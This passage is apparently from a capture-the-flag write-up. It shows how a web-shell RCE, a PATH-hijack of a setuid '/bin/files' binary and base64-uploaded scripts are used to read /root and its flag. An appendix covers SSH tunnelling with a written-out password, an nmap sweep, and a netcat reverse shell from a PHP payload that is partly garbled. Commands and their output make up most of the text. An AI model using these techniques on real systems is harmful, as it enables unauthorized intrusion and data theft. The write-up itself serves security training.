```bash
export PATH=/tmp/.w:$PATH
cd /tmp/.w
echo "/bin/ls -alR  /root > /tmp/.w/out.txt" > ls
chmod +x ls
/bin/files
```
What this says is:
1. Update the `PATH` so that our working directory is first in the search path (before `/bin/ls`)
2. Cd into our working directory
3. Create the `ls` script we want to run: It will print the contents of `/root` into `out.txt`
4. Make the script executable
5. Run `/bin/files` which will execute our `ls` script
We encode the script as base64 and upload it to the server, saving it as `script`:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell&command=ls" -X POST --data-urlencode "cmd=echo ZXhwb3J0IFBBVEg9L3RtcC8udzokUEFUSApjZCAvdG1wLy53CmVjaG8gIi9iaW4vbHMgLWFsUiAgL3Jvb3QgPiAvdG1wLy53L291dC50eHQiID4gbHMKY2htb2QgK3ggbHMKL2Jpbi9maWxlcw== | base64 -d > /tmp/.w/script"  && echo
```
We make it executable:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=chmod +x /tmp/.w/script"
```
Run it, and read the result:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=/tmp/.w/script" 
Welcome!
This is your files:
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=ls -al /tmp/.w" 
total 16
drwxr-xr-x 2 www-data www-data 4096 Feb 16 18:23 .
drwxrwxrwt 3 root     root     4096 Feb 16 18:21 ..
-rwxr-xr-x 1 www-data www-data   32 Feb 16 18:23 ls
-rw-r--r-- 1 root     root        0 Feb 16 18:23 out.txt
-rwxr-xr-x 1 www-data www-data  106 Feb 16 18:22 script
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=cat /tmp/.w/out.txt"
/root:
total 192
drwx------  7 root root   4096 Feb  9 02:52 .
drwxr-xr-x 23 root root   4096 Feb 11 06:45 ..
-rw-------  1 root root  17256 Feb 13 13:53 .bash_history
-rw-r--r--  1 root root   3106 Apr  9  2018 .bashrc
drwx------  2 root root   4096 Jan 22 08:38 .cache
drwx------  3 root root   4096 Jan 22 08:38 .gnupg
-rw-------  1 root root     28 Jan 22 09:06 .lesshst
drwxr-xr-x  3 root root   4096 Jan 22 08:37 .local
-rw-r--r--  1 root root    148 Aug 17  2015 .profile
-rw-r--r--  1 root root     66 Jan 22 08:40 .selected_editor
drwx------  2 root root   4096 Feb  8 19:08 .ssh
-rw-------  1 root root  10723 Feb  9 02:52 .viminfo
-rwxr-xr-x  1 root root    100 Jan 22 08:42 clearlog.sh
-rwx------  1 root root 110592 Jan 29 20:32 crackme.exe
-r--------  1 root root    257 Feb  2 14:35 flag.txt
drwxr-xr-x  2 root root   4096 Feb  6 11:06 visitors
/root/.cache:
total 8
drwx------ 2 root root 4096 Jan 22 08:38 .
drwx------ 7 root root 4096 Feb  9 02:52 ..
-rw-r--r-- 1 root root    0 Jan 22 08:38 motd.legal-displayed
/root/.gnupg:
total 12
drwx------ 3 root root 4096 Jan 22 08:38 .
drwx------ 7 root root 4096 Feb  9 02:52 ..
drwx------ 2 root root 4096 Jan 22 08:38 private-keys-v1.d
/root/.gnupg/private-keys-v1.d:
total 8
drwx------ 2 root root 4096 Jan 22 08:38 .
drwx------ 3 root root 4096 Jan 22 08:38 ..
/root/.local:
total 12
drwxr-xr-x 3 root root 4096 Jan 22 08:37 .
drwx------ 7 root root 4096 Feb  9 02:52 ..
drwx------ 3 root root 4096 Jan 22 08:37 share
/root/.local/share:
total 12
drwx------ 3 root root 4096 Jan 22 08:37 .
drwxr-xr-x 3 root root 4096 Jan 22 08:37 ..
drwx------ 2 root root 4096 Jan 22 08:37 nano
/root/.local/share/nano:
total 12
drwx------ 2 root root 4096 Jan 22 08:37 .
drwx------ 3 root root 4096 Jan 22 08:37 ..
-rw------- 1 root root   63 Feb  6 07:11 search_history
/root/.ssh:
total 12
drwx------ 2 root root 4096 Feb  8 19:08 .
drwx------ 7 root root 4096 Feb  9 02:52 ..
-rw------- 1 root root 2024 Feb 14 23:46 authorized_keys
/root/visitors:
total 588
drwxr-xr-x 2 root root   4096 Feb  6 11:06 .
drwx------ 7 root root   4096 Feb  9 02:52 ..
-rw-r--r-- 1 root root 426434 Feb 16 18:29 logged_users.txt
-rw-r--r-- 1 root root 150271 Feb 16 18:29 total_visitors.txt
-rw-r--r-- 1 root root   2659 Feb 16 18:20 uniq_visitors.txt
```
We read the `root` directory!
We can dump the contents of `flag.txt` using the same method:
```
Send this md5 flag to: PI:EMAIL with "flag" as Subject and we will contact you...
================================
a231d0273d108b9d3e00596304e2f5e0
================================
Nice Job skid :).
Now try to solve the next step...
```
And read `crackme.exe` as well (encoding it as base64), to get to the next level:
```console
root@kali:/media/sf_CTFs/hoshen/3# file crackme.exe
/root/CTFs/hoshen/crackme.exe: PE32 executable (console) Intel 80386, for MS Windows
```
## Appendix A
In the first few days of the CTF, it was possible to arrive to this challenge directly from the first challenge without decrypting the PCAP. This is a short description of how this could be done.
After logging on to `PI:EMAIL` via SSH, it was possible to run `nmap` and search for additional hosts on the same subnet. `10.0.0.7`, which is the internal address of `13.67.133.176`, was one of the hosts identified. It was then possible to perform a port scan and find port 80 open.
Using SSH tunneling, it was possible to tunnel remote port 80 to a local port and view the website on a local browser:
```console
root@kali:/media/sf_CTFs/hoshen/1# sshpass -p 'Sec0ndPh@se' ssh -N -L 9999:10.0.0.7:80 PI:EMAIL
```
The command above allows us to view the website on local port 9999:
```console
root@kali:/media/sf_CTFs/hoshen/1# curl -s localhost:9999/index.php | grep Hostname
Hostname:Port 13.67.133.176:80 
```
Since `index.php` called `phpinfo()`, it was possible to find the external address of the host. 
This also made it easier to open a reverse shell, saving the need to open ports in the router.
First, we open a listner on `10.0.0.5` (which is the internal address of `104.43.243.221`):
```console
cuser@HoshenCtf2:~$ nc -lvp 4445
Listening on [0.0.0.0] (family 0, port 4445)
```
Then, using the RCE exploit via the website, we run the following code on `10.0.0.7`:
```php
$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```
Now, back to `10.0.0.5` for the reverse shell:
```console
cuser@HoshenCtf2:~$ nc -lvp 4445
Listening on [0.0.0.0] (family 0, port 4445)
Connection from 10.0.0.7 36238 received!
/bin/sh: 0: can't access tty; job control turned off
$ ls
gallery
index.html
index.php
pages
pics
test.php
web.css
$
```
At some point, `nmap` and `nc` were removed and access to `10.0.0.7` was blocked.